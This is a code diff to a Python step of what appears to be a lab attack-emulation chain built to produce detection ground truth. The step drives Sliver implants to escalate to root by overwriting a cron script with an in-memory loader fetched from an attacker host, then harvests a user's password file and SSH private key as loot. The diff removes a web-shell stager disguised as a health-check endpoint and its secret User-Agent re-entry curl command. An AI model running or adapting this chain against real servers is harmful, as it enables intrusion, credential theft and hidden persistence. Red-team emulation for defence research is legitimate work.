@@ -1,6 +1,6 @@
-"""Advanced privesc + credential harvest + persistence on the apache webserver.
+"""Advanced privesc + credential harvest on the apache webserver.
 
-Three sub-phases in one chain step:
+Two sub-phases in one chain step:
 
   A. Cron-overwrite privesc (T1053.003 + T1620 + T1036.005)
      Build the same Base64 in-memory loader the initial exploit uses and
@@ -17,12 +17,9 @@ Three sub-phases in one chain step:
      ``<results_dir>/webserver-loot/`` and stage them in ``ctx.state`` for
      PR-C (apache -> john lateral via the stolen SSH key).
 
-  C. Web-shell persistence drop (T1505.003)
-     Drop a tiny CGI stager into ``/usr/local/apache2/cgi-bin/`` as root
-     (the directory is owned by ``john.stravidis``, mode 0775, so www-data
-     couldn't write here during enumeration). The stager looks like a
-     routine health-check endpoint to anyone glancing at cgi-bin and
-     respawns the implants when curl'd with the magic User-Agent.
+The T1505.003 web-shell persistence drop is delivered by a separate chain
+step, :mod:`advanced_webserver_persistence`, so the SOC ground truth gives
+that tactic its own narrow start/end window.
 """
 # MITRE ATT&CK:
 #   T1053.003 – Scheduled Task/Job: Cron               (privesc vector)
@@ -31,7 +28,6 @@ Three sub-phases in one chain step:
 #   T1036.005 – Masquerading: Match Legitimate Name    (`[httpd]` argv[0], now root)
 #   T1552.001 – Unsecured Credentials: Credentials In Files  (john's .env as root)
 #   T1552.004 – Unsecured Credentials: Private Keys    (john's id_ed25519 as root)
-#   T1505.003 – Server Software Component: Web Shell   (cgi-bin persistence)
 
 import json
 import re
@@ -42,6 +38,7 @@ from chainlog import log
 from advanced_initial_access import (
     build_payload,
     sliver_exec,
+    sliver_upload,
     _list_sliver,
     _SESSION_HEADER_RE,
 )
@@ -63,10 +60,6 @@ HARVEST_PATHS = [
 
 # Loot file inside the run's results dir. PR-C reads this to bootstrap john_ws.
 LOOT_FILENAME = "webserver-loot.json"
-
-# Persistence stager that the attacker drops in cgi-bin (as root) for re-entry.
-STAGER_LOCAL_PATH  = "/Attack-chain/payloads/health_check.cgi"
-STAGER_REMOTE_PATH = "/usr/local/apache2/cgi-bin/health_check.cgi"
 
 
 def _build_root_loader_script(kali_host: str, file_port: int = 8000) -> str:
@@ -155,16 +148,10 @@ def subphase_cron_overwrite(sliver_session_id: str, cron_script: str,
     before = _capture_existing_session_ids()
     log(f"[*] Existing session(s) before cron tick: {sorted(before)}")
 
-    log(f"[*] sliver: upload -o {local_loader} -> {cron_script}")
-    # -o / --overwrite lets Sliver replace an existing file (cleanup.sh
-    # already exists on apache; without it Sliver returns
-    # FailedPrecondition: "...exists, but the overwrite flag was not set").
-    sliver_exec(
-        sliver_session_id,
-        f"upload -o {local_loader} {cron_script}",
-        f"execute -o chmod 755 {cron_script}",
-        f"execute -o ls -la {cron_script}",
-    )
+    log(f"[*] sliver: upload {local_loader} -> {cron_script}  (chmod 755)")
+    sliver_upload(sliver_session_id, str(local_loader), cron_script, chmod="755")
+    # Confirm the upload landed; useful when debugging cron-tick failures.
+    sliver_exec(sliver_session_id, f"execute -o ls -la {cron_script}")
     log("[*] Cron will fire within 60 s -- polling for the new root session...")
 
     deadline = time.time() + CRON_POLL_MAX_SECS
@@ -227,34 +214,10 @@ def subphase_harvest_creds(root_session_id: str, scratch_dir: Path) -> dict:
     }
 
 
-def subphase_persist_webshell(root_session_id: str) -> str | None:
-    """Sub-phase C: drop the cgi-bin web-shell stager as root (T1505.003).
-
-    Uses the root session because ``/usr/local/apache2/cgi-bin/`` is owned
-    by ``john.stravidis`` (mode 0775) and www-data can't write there. The
-    stager looks like a routine health-check; re-entry is via curl with
-    the magic User-Agent (see ``payloads/health_check.cgi`` docstring).
-    """
-    log("\n=== Sub-phase C: T1505.003 web-shell persistence (as root) ===")
-    if not Path(STAGER_LOCAL_PATH).is_file():
-        log(f"[-] stager missing on kali: {STAGER_LOCAL_PATH} -- skipping")
-        return None
-    log(f"[*] sliver: upload -o {STAGER_LOCAL_PATH} -> {STAGER_REMOTE_PATH}")
-    sliver_exec(
-        root_session_id,
-        f"upload -o {STAGER_LOCAL_PATH} {STAGER_REMOTE_PATH}",
-        f"execute -o chmod 755 {STAGER_REMOTE_PATH}",
-        f"execute -o ls -la {STAGER_REMOTE_PATH}",
-    )
-    log(f"[+] persistence path: {STAGER_REMOTE_PATH}")
-    log("    re-entry: curl -A 'ReSpawnHttpdCache/1.0' http://router/cgi-bin/health_check.cgi")
-    return STAGER_REMOTE_PATH
-
-
 def run(sliver_session_id: str, cron_script: str,
         kali_host: str = "10.10.0.2",
         results_dir: str = "/Attack-chain/results") -> dict:
-    """Run the privesc + credential-harvest + persistence step.
+    """Run the privesc + credential-harvest step.
 
     Args:
         sliver_session_id: ID of the www-data session implant (from PR-B exploit).
@@ -276,7 +239,6 @@ def run(sliver_session_id: str, cron_script: str,
 
     loot = subphase_harvest_creds(root_id, scratch_dir)
     loot["root_sliver_session"] = root_id
-    loot["persistence_path"] = subphase_persist_webshell(root_id)
 
     # Persist the loot for the SOC ground truth + the next PR.
     loot_json_path = scratch_dir / LOOT_FILENAME
@@ -286,12 +248,11 @@ def run(sliver_session_id: str, cron_script: str,
     log(f"[+] Wrote loot bundle: {loot_json_path}")
 
     log("\n" + "=" * 60)
-    log("[*] Webserver privesc + harvest + persistence complete:")
+    log("[*] Webserver privesc + harvest complete:")
     log(f"    root_sliver_session : {root_id}")
     log(f"    john_ssh_key bytes  : {len(loot.get('john_ssh_key') or '')}")
     log(f"    john_password       : {loot.get('john_password')}")
     log(f"    deploy_log bytes    : {len(loot.get('deploy_log') or '')}")
-    log(f"    persistence_path    : {loot.get('persistence_path')}")
     log("=" * 60)
 
     return loot
